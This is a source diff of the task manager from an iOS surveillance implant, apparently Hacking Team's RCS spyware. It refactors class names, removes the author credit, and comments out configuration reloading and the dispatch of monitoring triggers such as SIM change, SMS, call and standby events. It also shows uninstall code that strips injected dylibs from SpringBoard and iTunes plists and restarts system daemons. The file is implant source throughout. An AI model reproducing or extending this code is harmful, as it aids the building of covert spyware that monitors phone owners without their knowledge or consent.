@@ -1,11 +1,11 @@
 /*
- * RCSIpony - Task Manager
+ * RCSiOS - Task Manager
  *  This class will be responsible for managing all the operations within
  *  Events/Actions/Agents, thus the Core will have to deal with them in the
  *  most generic way.
  * 
  *
- * Created by Alfredo 'revenge' Pesoli on 21/05/2009
+ * Created on 21/05/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -27,10 +27,10 @@
 #import "RCSITaskManager.h"
 #import "RCSIConfManager.h"
 #import "RCSILogManager.h"
-#import "RCSIActions.h"
+#import "RCSIActionManager.h"
 #import "RCSICommon.h"
 #import "RCSINotificationSupport.h"
-#import "RCSIEvents.h"
+#import "RCSIEventManager.h"
 #import "RCSIEventTimer.h"
 
 #define JSON_CONFIG
@@ -121,7 +121,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                 [[[NSBundle mainBundle] executablePath] lastPathComponent]];
               
               //[mConfigManager setDelegate: self];
-              mActions = [[RCSIActions alloc] init];
+              mActions = [[RCSIActionManager alloc] init];
               
               mSharedMemory = mSharedMemoryCommand;
               
@@ -161,204 +161,177 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark -
 
 
-- (BOOL)loadInitialConfiguration
-{
-  if ([mConfigManager loadConfiguration] == YES)
-    {
-      return TRUE;
-    }
-  else
-    {
-      // TODO: Load default configuration
-#ifdef DEBUG
-      NSLog(@"An error occurred while loading the configuration file");
-#endif
-      exit(-1);
-    }
-  
-  return TRUE;
-}
+//- (BOOL)loadInitialConfiguration
+//{
+//  if ([mConfigManager loadConfiguration] == YES)
+//    {
+//      return TRUE;
+//    }
+//  else
+//    {
+//      // TODO: Load default configuration
+//#ifdef DEBUG
+//      NSLog(@"An error occurred while loading the configuration file");
+//#endif
+//      exit(-1);
+//    }
+//  
+//  return TRUE;
+//}
 
-- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
-{
-  NSString *configUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@", 
-                                                                 [[NSBundle mainBundle] bundlePath], 
-                                                                 gConfigurationUpdateName];
-  
-  NSString *configurationName = [[NSString alloc] initWithFormat: @"%@/%@", 
-                                                                  [[NSBundle mainBundle] bundlePath], 
-                                                                  gConfigurationName]; 
-                                                                                                                                                                                              
-  if ([[NSFileManager defaultManager] fileExistsAtPath: configUpdatePath] == TRUE)
-    {
-      NSError *rmErr;
-      
-      if (![[NSFileManager defaultManager] removeItemAtPath: configUpdatePath error: &rmErr])
-        {
-#ifdef DEBUG_CONF_MANAGER
-          infoLog(@"Error remove file configuration %@", rmErr);
-#endif
-        }
-    }
-  
-  if ([aConfigurationData writeToFile: configUpdatePath
-                           atomically: YES])
-    {
-#ifdef DEBUG_CONF_MANAGER
-      infoLog(@"file configuration write correctly");
-#endif
-    }
-  
-  if ([mConfigManager checkConfigurationIntegrity: configUpdatePath])
-    {
-      // If we're here it means that the file is ok thus it is safe to replace
-      // the original one
-      if ([[NSFileManager defaultManager] removeItemAtPath: configurationName
-                                                     error: nil])
-        {
-          if ([[NSFileManager defaultManager] moveItemAtPath: configUpdatePath
-                                                      toPath: configurationName
-                                                       error: nil])
-            {
-              mShouldReloadConfiguration = YES;
-              [configUpdatePath release];
-              [configurationName release];
-              return TRUE;
-            }
-        }
-    }
-  else
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: configUpdatePath
-                                                 error: nil];
-    
-      RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
-      [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
-      [infoManager release];
-    }
-    
-  [configUpdatePath release];
-  [configurationName release];
-  return FALSE;
-}
-
-// Restart component in case of failure:
-// the configuration is invalid, or some components don't stopped
-- (void)checkManagersAndRestart
-{
-  RCSIEvents *eventManager = [RCSIEvents sharedInstance];
-  RCSIActions *actionManager = [RCSIActions sharedInstance];
-  
-  // restart the action manager runloop
-  if ([actionManager stop] == TRUE)
-    [actionManager start];
-  
-  // restart events manager runloop
-  if ([eventManager stop] == TRUE)
-    [eventManager start];
-  
-  // restart agents
-  if ([self stopAgents] == TRUE)
-    [self startAgents];
-  
-  // restart event thread here
-  if ([self stopEvents] == TRUE)
-    [self startEvents];
-}
+//- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
+//{
+//  NSString *configUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@", 
+//                                                                 [[NSBundle mainBundle] bundlePath], 
+//                                                                 gConfigurationUpdateName];
+//  
+//  NSString *configurationName = [[NSString alloc] initWithFormat: @"%@/%@", 
+//                                                                  [[NSBundle mainBundle] bundlePath], 
+//                                                                  gConfigurationName]; 
+//                                                                                                                                                                                              
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: configUpdatePath] == TRUE)
+//    {
+//      NSError *rmErr;
+//      
+//      if (![[NSFileManager defaultManager] removeItemAtPath: configUpdatePath error: &rmErr])
+//        {
+//#ifdef DEBUG_CONF_MANAGER
+//          infoLog(@"Error remove file configuration %@", rmErr);
+//#endif
+//        }
+//    }
+//  
+//  if ([aConfigurationData writeToFile: configUpdatePath
+//                           atomically: YES])
+//    {
+//#ifdef DEBUG_CONF_MANAGER
+//      infoLog(@"file configuration write correctly");
+//#endif
+//    }
+//  
+//  if ([mConfigManager checkConfigurationIntegrity: configUpdatePath])
+//    {
+//      // If we're here it means that the file is ok thus it is safe to replace
+//      // the original one
+//      if ([[NSFileManager defaultManager] removeItemAtPath: configurationName
+//                                                     error: nil])
+//        {
+//          if ([[NSFileManager defaultManager] moveItemAtPath: configUpdatePath
+//                                                      toPath: configurationName
+//                                                       error: nil])
+//            {
+//              mShouldReloadConfiguration = YES;
+//              [configUpdatePath release];
+//              [configurationName release];
+//              return TRUE;
+//            }
+//        }
+//    }
+//  else
+//    {
+//      [[NSFileManager defaultManager] removeItemAtPath: configUpdatePath
+//                                                 error: nil];
+//    
+//      RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+//      [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
+//      [infoManager release];
+//    }
+//    
+//  [configUpdatePath release];
+//  [configurationName release];
+//  return FALSE;
+//}
 
 - (BOOL)reloadConfiguration
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  if (mShouldReloadConfiguration == YES) 
-    {
-#ifdef DEBUG_
-    NSLog(@"%s: reloading...",__FUNCTION__);
-#endif
-      mShouldReloadConfiguration = NO;
-      
-      RCSIEvents  *eventManager  = [RCSIEvents sharedInstance];
-      RCSIActions *actionManager = [RCSIActions sharedInstance];
-      
-      // Now stop all tasks and reload configuration
-      if ([self stopEvents] == TRUE)
-        { 
-          // no issues for timing it out
-          if ([eventManager stop] == FALSE)
-            {
-#ifdef DEBUG_
-              NSLog(@"%s: event manager stop timeout reached",__FUNCTION__);
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_
-            NSLog(@"%s: event manager stopped",__FUNCTION__);
-#endif      
-            }
-            
-          // no issues for timing it out  
-          if ([actionManager stop] == TRUE)
-            {
-#ifdef DEBUG_
-               NSLog(@"%s: action manager stopped",__FUNCTION__);
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_
-              NSLog(@"%s: action manager stop timeout reached",__FUNCTION__);
-#endif      
-            }
-            
-          if ([self stopAgents] == TRUE)
-            {
-#ifdef DEBUG_
-              NSLog(@"%s: agents stopped",__FUNCTION__);
-#endif  
-            }
-          else
-            {
-#ifdef DEBUG_
-              NSLog(@"%s: agents stop timeout reached",__FUNCTION__);
-#endif      
-            }
-            
-          // Now reload configuration
-          if ([mConfigManager loadConfiguration] == YES)
-            {
-              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
-              [infoManager logActionWithDescription: @"New configuration activated"];
-              [infoManager release];
-              
-              // start the action manager runloop
-              [actionManager start];
-            
-              // Start event thread here
-              [self startEvents];
-              
-              // start events manager runloop
-              [eventManager start];
-              
-              // Start agents
-              // no for rcs8
-              //[self startAgents];
-            }
-          else
-            {
-              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
-              [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
-              [infoManager release];
-
-              return NO;
-            }
-        }
-      else
-        {
-          return FALSE;
-        }
-    }
-  
+//  if (mShouldReloadConfiguration == YES) 
+//    {
+//#ifdef DEBUG_
+//    NSLog(@"%s: reloading...",__FUNCTION__);
+//#endif
+//      mShouldReloadConfiguration = NO;
+//      
+//      RCSIEventManager  *eventManager  = [RCSIEventManager sharedInstance];
+//      RCSIActionManager *actionManager = [RCSIActionManager sharedInstance];
+//      
+//      // Now stop all tasks and reload configuration
+//      if ([self stopEvents] == TRUE)
+//        { 
+//          // no issues for timing it out
+//          if ([eventManager stop] == FALSE)
+//            {
+//#ifdef DEBUG_
+//              NSLog(@"%s: event manager stop timeout reached",__FUNCTION__);
+//#endif
+//            }
+//          else
+//            {
+//#ifdef DEBUG_
+//            NSLog(@"%s: event manager stopped",__FUNCTION__);
+//#endif      
+//            }
+//            
+//          // no issues for timing it out  
+//          if ([actionManager stop] == TRUE)
+//            {
+//#ifdef DEBUG_
+//               NSLog(@"%s: action manager stopped",__FUNCTION__);
+//#endif
+//            }
+//          else
+//            {
+//#ifdef DEBUG_
+//              NSLog(@"%s: action manager stop timeout reached",__FUNCTION__);
+//#endif      
+//            }
+//            
+//          if ([self stopAgents] == TRUE)
+//            {
+//#ifdef DEBUG_
+//              NSLog(@"%s: agents stopped",__FUNCTION__);
+//#endif  
+//            }
+//          else
+//            {
+//#ifdef DEBUG_
+//              NSLog(@"%s: agents stop timeout reached",__FUNCTION__);
+//#endif      
+//            }
+//            
+//          // Now reload configuration
+//          if ([mConfigManager loadConfiguration] == YES)
+//            {
+//              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+//              [infoManager logActionWithDescription: @"New configuration activated"];
+//              [infoManager release];
+//              
+//              // start the action manager runloop
+//              [actionManager start];
+//              
+//              // start events manager runloop
+//              [eventManager start];
+//              
+//              // Start agents
+//              // no for rcs8
+//              //[self startAgents];
+//            }
+//          else
+//            {
+//              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+//              [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
+//              [infoManager release];
+//
+//              return NO;
+//            }
+//        }
+//      else
+//        {
+//          return FALSE;
+//        }
+//    }
+//  
   [pool release];
   
   return YES;
@@ -380,7 +353,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                                      error: nil];
 
           // Remove the entry in SB plists 
-          removeDylib(sbPathname);
+          removeDylibFromPlist(sbPathname);
         
           // unload envs by dylib
           uninstCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -407,7 +380,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           [uninstCommand release];
         
           // remove envs from itunes
-          removeDylib(itPathname);
+          removeDylibFromPlist(itPathname);
         
           // restart services
           system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\";" 
@@ -429,9 +402,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             }
 
           // Closing lock socket
-          if (gLockSock != -1)
+          if (mLockSock != -1)
             {
-              close(gLockSock);
+              close(mLockSock);
 #ifdef DEBUG
               NSLog(@"closing socket ok");
 #endif
@@ -1687,99 +1660,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark -
 #pragma mark Monitors
 #pragma mark -
-
-- (BOOL)startEvents
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
-  id theEvent;
-  int eventPos = 0;
-  
-  RCSIEvents *events = [RCSIEvents sharedInstance];
-  
-  NSEnumerator *enumerator = [mEventsList objectEnumerator];
-  
-  while ((theEvent = [enumerator nextObject]))
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-      switch ([[theEvent threadSafeObjectForKey: @"type"
-                                      usingLock: gTaskManagerLock] intValue])
-        {
-        case EVENT_TIMER:
-          {
-            // timers with NSTimer
-            [events addEventTimerInstance: theEvent];
-            break;
-          }
-        case EVENT_PROCESS:
-          {
-            [events addEventProcessInstance: theEvent];
-            break;
-          }
-        case EVENT_CONNECTION:
-          {
-            [events addEventConnectivityInstance:theEvent];
-            break; 
-          }
-        case EVENT_BATTERY:
-          {
-            [events addEventBatteryInstance:theEvent];
-            break;
-          }
-        case EVENT_AC:
-          {
-            [events addEventACInstance:theEvent];
-            break;
-          }
-        case EVENT_STANDBY:
-          {
-#ifdef JSON_CONFIG
-            [events addEventScreensaverInstance:theEvent];
-            [events startEventStandBy: eventPos];
-#else
-            // start remote events (triggered in SBApplication)
-            [events eventStandBy: theEvent];
-#endif
-            break;
-          }
-        case EVENT_SIM_CHANGE:
-          {
-#ifdef JSON_CONFIG
-            [events addEventSimChangeInstance:theEvent];
-#else
-            // start remote events (triggered in SBApplication)
-            [events eventSimChange:theEvent];
-#endif
-            break;
-          }
-        case EVENT_SMS:
-          {
-            break;
-          }
-        case EVENT_CALL:
-          {
-              break;
-          }
-        case EVENT_QUOTA:
-          {
-            break;
-          }
-        default:
-          {
-            break;
-          }
-        }
-      
-      eventPos++;
-      
-      [innerPool release];
-    }
-
-  [outerPool release];
-  
-  return TRUE;
-}
 
 - (BOOL)stopEvents
 {
